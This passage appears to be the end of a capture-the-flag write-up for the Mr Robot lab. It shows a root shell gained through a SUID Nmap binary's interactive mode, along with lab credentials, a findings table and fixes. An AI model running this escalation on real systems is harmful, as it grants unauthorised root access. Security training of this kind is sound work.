## 9. Step 9 — Privilege Escalation via SUID Nmap

### Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

![image.png](image%2020.png)

**Key finding:**

```
/usr/local/bin/nmap
```

![image.png](image%2021.png)

Nmap v5.21 has the **SUID bit set** — it runs as root regardless of who executes it. Old versions of Nmap include an `--interactive` mode that allows shell command execution.

### Exploit nmap interactive mode

```bash
/usr/local/bin/nmap --interactive
```

```
Starting Nmap V. 5.21 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
#
```

### Verify root access

```bash
# whoami
root
```

> ✅ **Root shell obtained via SUID Nmap GTFOBins exploit!**
>

## 🔍 Key Findings Summary

| Finding | Severity | Details |
| --- | --- | --- |
| Credentials in Base64 on web page | 🔴 Critical | `elliot:ER28-0652` exposed at `/license/` |
| WordPress admin access | 🔴 Critical | Theme editor allows PHP code injection |
| Weak password (robot) | 🟠 High | MD5 hash cracked instantly — `abcdefghijklmnopqrstuvwxyz` |
| SUID on outdated Nmap v5.21 | 🔴 Critical | Allows root shell via `--interactive` mode |
| Sensitive files in robots.txt | 🟠 High | Exposed `/fsocity.dic` and `/key-1-of-3.txt` |

## 🛡️ Recommendations

| Vulnerability | Fix |
| --- | --- |
| Credentials encoded in Base64 on web | Never store credentials in web-accessible files — use environment variables or vaults |
| WordPress Theme Editor enabled | Disable file editing: add `define('DISALLOW_FILE_EDIT', true)` to wp-config.php |
| Weak MD5 password hash | Use bcrypt or Argon2 for password hashing — never plain MD5 |
| SUID bit on Nmap | Remove SUID: `chmod u-s /usr/local/bin/nmap` — update to current Nmap version |
| Sensitive paths in robots.txt | Never list sensitive files in robots.txt — it's publicly readable |
| Outdated WordPress and PHP | Update WordPress, PHP, and all plugins to latest stable versions |
